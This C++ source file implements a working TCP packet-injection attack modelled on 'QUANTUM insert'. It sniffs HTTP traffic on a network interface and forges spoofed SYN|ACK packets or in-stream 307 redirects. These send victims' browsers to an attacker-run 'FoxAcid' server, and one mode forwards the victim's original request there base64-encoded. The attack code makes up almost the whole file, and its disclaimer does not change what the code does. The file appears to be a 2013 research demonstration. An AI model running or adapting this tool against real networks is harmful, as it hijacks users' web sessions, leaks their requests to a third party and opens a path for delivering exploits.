/* Very simple quantum-inject case study to see whats possible.
 *
 * It redirects HTTP traffic to the acid.pl script, which just prints
 * a string and then redirects again to original destination.
 *
 * The 1st method does not work with virtual hosting as the info
 * is not available when the redirect happens (SYN|ACK spoof). So
 * this is only suitable for sites that carry all info in the IP,
 * and do not require a Host: header field, but it has the advantage
 * of not needing to see the SYN|ACK (if the target is asynchronously
 * routed).
 *
 * The 2nd method works in all Host/Path cases, but requires connection
 * tracking (need to see the SYN|ACK) and passes the original GET
 * request to the FoxAcid system where it is decoded and Host:-properly
 * forwarded.
 *
 * (C) 2013 Sebastian Krahmer under the GPL.
 *
 * Needs to see SYN packets and can be tested on localhost:
 *
 * c++ -std=c++11 -I/usr/local/include qi.cc -L/usr/local/lib -lusi++ -lpcap -ldnet -o qi
 * ./qi 2 eth0 192.168.2.253 and also run acid.pl on 192.168.2.253
 * given that you have 2 IPs on your test setup: 192.168.2.x for the
 * client browser connecting, and 192.168.2.253 for FoxAcid to bind to.
 *
 * As usual: standard disclaimer applies. Not to be used for evil doings
 * (it only prints a info anyway and does not contain any exploit code).
 *
 */
#include <cstdio>
#include <string>
#include <iostream>
#include <errno.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <map>
#include <usi++/usi++.h>


using namespace std;
using namespace usipp;


void die(const string &e)
{
	cerr<<e<<endl;
	exit(errno);
}


static const char *b64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";


/* The base64 routines have been taken from the Samba 3 source (GPL)
 * and have been C++-ified
 */
string &b64_encode(const string &src, string &dst)
{
	unsigned int bits = 0;
	int char_count = 0, i = 0;

	dst = "";
	string::size_type len = src.size();
	while (len--) {
		unsigned int c = (unsigned char)src[i++];
		bits += c;
		char_count++;
		if (char_count == 3) {
			dst += b64[bits >> 18];
			dst += b64[(bits >> 12) & 0x3f];
			dst += b64[(bits >> 6) & 0x3f];
	    		dst += b64[bits & 0x3f];
		    	bits = 0;
		    	char_count = 0;
		} else	{
	    		bits <<= 8;
		}
    	}
	if (char_count != 0) {
		bits <<= 16 - (8 * char_count);
		dst += b64[bits >> 18];
		dst += b64[(bits >> 12) & 0x3f];
		if (char_count == 1) {
			dst += '=';
			dst += '=';
		} else {
			dst += b64[(bits >> 6) & 0x3f];
			dst += '=';
		}
	}
	return dst;
}


// track a GET, and do your stuff
// TODO: conntrack timeouts (easy)
int do_qi2(const string &dev, const string &acid)
{
	string pkt = "", src = "", dst = "";
	uint32_t src_ip = 0, dst_ip = 0;
	uint16_t src_port = 0;
	uint64_t u64 = 0;
	string redir_base = "HTTP/1.1 307 Moved Permanently\r\n"
	                    "Content-Length: 0\r\n"
	                    "Location: http://", redir = "", b64 = "";
	redir_base += acid;
	redir_base += "/&";

	map<uint32_t, char> mission_achieved, fox_acids;

	// TCP ISN -> src IP
	map<uint32_t, uint32_t> syns;

	// src-IP|port -> SEQ#
	map<uint64_t, uint32_t> synacks;


	TCP4 *mon = new TCP4("0.0.0.0");
	TCP4 *snd = new TCP4("0.0.0.0");

	if (!mon || !snd)
		die("Unable to create TCP instances");

	if (mon->init_device(dev, 1, 1500) < 0)
		die(mon->why());
	if (mon->setfilter("tcp and port 80") < 0)
		die(mon->why());

	in_addr ia;
	inet_pton(AF_INET, acid.c_str(), &ia);
	fox_acids[ia.s_addr] = 1;

	snd->set_srcport(80);
	snd->set_win(8192);

	for (;;) {
		mon->sniffpack(pkt);

		if (!mon->good()) {
			mon->error_reset();
			continue;
		}

		src_ip = mon->get_src();
		dst_ip = mon->get_dst();
		src_port = mon->get_srcport();

		// No double-redirection
		if (fox_acids.count(dst_ip) > 0 || fox_acids.count(src_ip) > 0 ||
		    mission_achieved.count(src_ip) > 0)
			continue;

		// track new connection
		if (mon->get_flags() == flags::th_syn) {
			if (mon->get_dstport() != 80)
				continue;
			syns[mon->get_seq() + 1] = mon->get_src();
			continue;
		}

		// track SYN|ACK to obtain valid SEQ#
		if (mon->get_flags() == (flags::th_syn|flags::th_ack)) {
			if (mon->get_srcport() != 80)
				continue;
			u64 = mon->get_dst();
			u64 <<= 32;
			synacks[u64|mon->get_dstport()] = mon->get_seq() + 1;
			continue;
		}

		if (mon->get_dstport() != 80)
			continue;

		// is there any tracked connection for this stream ?
		map<uint32_t, uint32_t>::iterator it = syns.find(mon->get_seq());
		if (it == syns.end())
			continue;
		if (it->second != mon->get_src())
			continue;

		// was it properly established?
		u64 = src_ip;
		u64 <<= 32;
		map<uint64_t, uint32_t>::iterator it2 = synacks.find(u64|src_port);
		if (it2 == synacks.end())
			continue;

		// At this point, we have a valid in-stream first HTTP request

		// is it a GET?
		if (pkt.find("GET") != 0)
			continue;


		snd->set_flags(flags::th_push|flags::th_ack);
		snd->set_ack(mon->get_seq() + pkt.size());
		snd->set_dst(src_ip);
		snd->set_src(dst_ip);
		snd->set_dstport(src_port);
		snd->set_seq(it2->second);

		redir = redir_base;
		redir += b64_encode(pkt, b64);
		redir += "\r\n\r\n";
		snd->sendpack(redir);

		// close connection
		snd->set_flags(flags::th_fin);
		snd->set_seq(it2->second + redir.size());
		snd->sendpack("");

		mission_achieved[src_ip] = 1;

		syns.erase(it);
		synacks.erase(it2);

		src = mon->get_src(src);
		dst = mon->get_dst(dst);
		cerr<<"New client "<<src<<":"<<src_port<<"->"<<dst<<":80"<<endl;
	}

	return -1;
}


// see a SYN and do your stuff
int do_qi1(const string &dev, const string &acid)
{
	string pkt = "", src = "", dst = "";
	uint32_t src_ip = 0, dst_ip = 0, seq = 0, start_seq = 0x1000;
	uint16_t src_port = 0;
	string redir_base = "HTTP/1.1 307 Moved Permanently\r\n"
	                    "Content-Length: 0\r\n"
	                    "Location: http://", redir = "";
	redir_base += acid;
	redir_base += "/?";

	map<uint32_t, char> mission_achieved, fox_acids;

	TCP4 *mon = new TCP4("0.0.0.0");
	TCP4 *snd = new TCP4("0.0.0.0");

	if (!mon || !snd)
		die("Unable to create TCP instances");

	if (mon->init_device(dev, 1, 1500) < 0)
		die(mon->why());
	if (mon->setfilter("tcp and dst port 80 and tcp[tcpflags] == tcp-syn") < 0)
		die(mon->why());

	in_addr ia;
	inet_pton(AF_INET, acid.c_str(), &ia);
	fox_acids[ia.s_addr] = 1;

	snd->set_srcport(80);
	snd->set_win(8192);

	for (;;) {
		mon->sniffpack(pkt);

		if (!mon->good()) {
			mon->error_reset();
			continue;
		}

		src_ip = mon->get_src();
		dst_ip = mon->get_dst();

		// No double-redirection
		if (fox_acids.count(dst_ip) > 0 || fox_acids.count(src_ip) > 0 ||
		    mission_achieved.count(src_ip) > 0)
			continue;

		src_port = mon->get_srcport();
		seq = mon->get_seq();
		src = mon->get_src(src);
		dst = mon->get_dst(dst);

		// complete TCP 3way HS
		snd->set_flags(flags::th_syn|flags::th_ack);
		snd->set_dst(src_ip);
		snd->set_src(dst_ip);
		snd->set_dstport(src_port);
		snd->set_seq(start_seq);
		snd->set_ack(seq + 1);
		snd->sendpack("");

		// send redirect
		snd->set_flags(flags::th_push);
		snd->set_seq(start_seq + 1);
		redir = redir_base;
		redir += dst;
		redir += "\r\n\r\n";
		snd->sendpack(redir);

		// some browsers accept resetted connections (chrome) and handle the redirect input,
		// some others dont (firefox), so send a FIN.
		snd->set_seq(start_seq + 1 + redir.size());
		snd->set_flags(flags::th_fin);
		snd->sendpack("");

		mission_achieved[src_ip] = 1;

		cerr<<"New client "<<src<<":"<<src_port<<"->"<<dst<<":80"<<endl;
	}

	return -1;
}


int main(int argc, char **argv)
{
	if (argc != 4) {
		cerr<<"Usage: qi <1|2> <device> <FoxAcid IP>\n";
		return 1;
	}

	if (string(argv[1]) == "1")
		return do_qi1(argv[2], argv[3]);
	else
		return do_qi2(argv[2], argv[3]);
}

